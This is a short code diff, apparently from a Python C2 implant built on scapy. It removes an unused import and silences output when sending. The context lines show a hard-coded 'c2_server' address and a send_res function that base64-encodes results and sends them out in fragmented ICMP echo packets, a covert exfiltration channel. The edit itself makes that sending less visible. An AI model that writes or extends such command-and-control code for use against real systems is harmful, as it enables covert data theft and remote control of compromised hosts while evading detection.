@@ -5,7 +5,6 @@ from threading import Thread, Lock
 from base64 import *
 import os
 import time
-import binascii
 
 c2_server="192.168.6.11"
 stop=0
@@ -15,7 +14,7 @@ def send_res(content):
 	try:
 		frags=fragment(IP(dst=c2_server)/ICMP(type="echo-request")/b64encode(content.encode('ascii')))
 		for frag in frags:
-			send(frag)
+			send(frag, verbose=False)
 	except Exception as e:
 		print(e)
 		
